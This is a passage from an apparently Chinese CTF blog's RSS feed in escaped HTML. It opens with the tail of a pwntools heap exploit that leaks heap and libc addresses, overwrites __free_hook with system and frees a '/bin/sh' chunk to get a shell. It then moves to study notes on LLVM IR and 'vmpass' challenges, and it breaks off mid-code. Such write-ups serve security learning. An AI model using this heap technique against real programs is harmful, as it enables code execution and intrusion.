function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;34&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = u64(r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add() &lt;span class=&#34;comment&#34;&gt;#1 0x370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add() &lt;span class=&#34;comment&#34;&gt;#2 0x390&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x501&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aimed_addr = heap_addr+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+p64(aimed_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()       &lt;span class=&#34;comment&#34;&gt;#1  0x370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()    &lt;span class=&#34;comment&#34;&gt;#20x8a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_add()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = u64(r.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x3ec0d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libcbase+ libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libcbase + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__free_hook&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)+p64(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
            <title>vm学习笔记</title>
            <link>http://example.com/2022/06/11/vm%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
            <category>Learning</category>
            <pubDate>Sat, 11 Jun 2022 19:28:16 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;vmlearning-笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vmlearning-笔记&#34;&gt;#&lt;/a&gt; vmlearning 笔记&lt;/h1&gt;
&lt;p&gt;首先清楚什么是 vm，虚拟机器，一种实现不同架构的程序的解释性的软件程序。virtual machine&lt;/p&gt;
&lt;p&gt;关于 vmpass 这种解释性的程序，工作原理是根据不同的 cou 架构，不同的程序会生成不同的机器语言代码，指令代码。这个中间文件称作 IR，一般有两种形式 ——bitcode, 二进制机器码，以及.ll 文件，后者是为了方便我们阅读的，可读性较高。&lt;/p&gt;
&lt;p&gt;vmpass 程序，对于我们提供的想要模拟运行的代码，我们需要提供类似于指令代码程序的文件，.ll 或者 bc 文件，而文件是被 assmebly 后的，所以里面会有相关的汇编指令（机器代码指令）的二进制代码。那么我们知道对于一台机器，其所能实现的操作是固定的，不同的编程语言，程序，最终都会被解释为一条条的机器指令，利用组成原理的知识，一条机器指令代码，需要有操作码以及操作数，有的时候需要寄存器，而且程序的运行必然会利用到一些判断标志，c,z 等等。这些都会被形象的存储在数组中。比如寄存器数组就会对应不同的寄存器，里面记录数据，提供’cpu’使用。而字符串也会被拆开，每个字符变为 16 进制数储存。（小端序，倒着看的字符串）&lt;/p&gt;
&lt;p&gt;0x72306F446B633442LL  ===&amp;gt;&amp;gt; ‘r0oDkc4B’   ===&amp;gt;&amp;gt;“B4ckD0or”&lt;/p&gt;
&lt;p&gt;关于 vm 的机制，后面再慢慢学习。&lt;/p&gt;
&lt;h2 id=&#34;ir代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ir代码&#34;&gt;#&lt;/a&gt; IR 代码&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MjA2MTA1L2FydGljbGUvZGV0YWlscy8xMTUyNzQyNDE/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjU0OTYwODk0MTY3ODE2ODM5MjIwNzclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPTE2NTQ5NjA4OTQxNjc4MTY4MzkyMjA3NyZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTE1Mjc0MjQxLW51bGwtbnVsbC4xNDIlNUV2MTMlNUVjb250cm9sLDE1NyU1RXYxNCU1RWNvbnRyb2wmYW1wO3V0bV90ZXJtPUlSJUU1JUI4JUI4JUU4JUE3JTgxJUU3JTlBJTg0JUU2JTkzJThEJUU0JUJEJTlDJUU2JThDJTg3JUU0JUJCJUE0JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==&#34;&gt;参考资料&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;IR 是一种中间产物，看了一理解位是对程序代码的指令化解析，而且适用于我们可以看懂的，可以理解位 llvm 下的汇编代码。bitcode 是纯二进制代码文件。&lt;/p&gt;
&lt;p&gt;简单的学习下&lt;/p&gt;
&lt;p&gt;源代码&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b=&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c = a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; d=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;+a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;IR 代码&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;; ModuleID = &lt;span class=&#34;string&#34;&gt;&amp;#x27;test.c&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source_filename = &lt;span class=&#34;string&#34;&gt;&amp;quot;test.c&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target datalayout = &lt;span class=&#34;string&#34;&gt;&amp;quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target triple = &lt;span class=&#34;string&#34;&gt;&amp;quot;x86_64-pc-linux-gnu&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;; Function Attrs: noinline nounwind optnone uwtable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;define i32 @main() &lt;span class=&#34;comment&#34;&gt;#0 &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = alloca i32, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = alloca i32, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = alloca i32, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; = alloca i32, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  store i32 &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, i32* %&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  store i32 &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, i32* %&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; = load i32, i32* %&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  store i32 %&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, i32* %&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; = load i32, i32* %&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  %&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; = add nsw i32 &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, %&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  store i32 %&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, i32* %&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, align &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ret i32 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;attributes &lt;span class=&#34;comment&#34;&gt;#0 = &amp;#123; noinline nounwind optnone uwtable &amp;quot;correctly-rounded-divide-sqrt-fp-math&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;disable-tail-calls&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;less-precise-fpmad&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;no-frame-pointer-elim&amp;quot;=&amp;quot;true&amp;quot; &amp;quot;no-frame-pointer-elim-non-leaf&amp;quot; &amp;quot;no-infs-fp-math&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;no-jump-tables&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;no-nans-fp-math&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;no-signed-zeros-fp-math&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;no-trapping-math&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;stack-protector-buffer-size&amp;quot;=&amp;quot;8&amp;quot; &amp;quot;target-cpu&amp;quot;=&amp;quot;x86-64&amp;quot; &amp;quot;target-features&amp;quot;=&amp;quot;+fxsr,+mmx,+sse,+sse2,+x87&amp;quot; &amp;quot;unsafe-fp-math&amp;quot;=&amp;quot;false&amp;quot; &amp;quot;use-soft-float&amp;quot;=&amp;quot;false&amp;quot; &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!llvm.module.flags = !&amp;#123;!&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!llvm.ident = !&amp;#123;!&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; = !&amp;#123;i32 &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, !&lt;span class=&#34;string&#34;&gt;&amp;quot;wchar_size&amp;quot;&lt;/span&gt;, i32 &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = !&amp;#123;!&lt;span class=&#34;string&#34;&gt;&amp;quot;clang version 6.0.0-1ubuntu2 (tags/RELEASE_600/final)&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们重点关注函数部分。开头是文件的一些信息，文件名，类型，等等。&lt;/p&gt;
&lt;p&gt;函数，define 定义一个函数，接着 i32 表示函数的返回值是 32 位的（这里我们定义的是 int）。alloca 大概就是谁年轻一个变量的空间。变量用数字做标识，按照先后顺序。% 加上一个数字就表示的是第几个变量，同样的 i32 说明变量是 32 位。align 则是说明变量在内存中 4 字节对齐。&lt;/p&gt;
&lt;p&gt;我们知道函数名在程序内存中是一个全局的符号，我们如何表示？@用于表示全局的标识，包括函数名以及全局变量。特别说明，区别函数与变量的方法是二者的定义形式不一样。函数使用 define 关键字。&lt;/p&gt;
&lt;p&gt;% 除了用于标识局部变量还用于标识寄存器。&lt;/p&gt;
&lt;p&gt;（后续继续补充）&lt;/p&gt;
&lt;p&gt;** 关于是否需要完全掌握 IR，其实还是需要根据本题目，有的题目需要对 IR 进行优化，从而达到对源代码程序的优化。&lt;/p&gt;
&lt;p&gt;​			有的题目和 IR 代码高度相关的那就得看懂吧！													——ayaka&lt;/p&gt;
&lt;h2 id=&#34;ctf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ctf&#34;&gt;#&lt;/a&gt; ctf&lt;/h2&gt;
&lt;p&gt;直接进入解题，vmpass 提供用户一整套完整的流程，包括库，vmpass 基于 c++ 编写。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;llvm/Pass.h&amp;quot;&lt;/span&gt;&lt;span 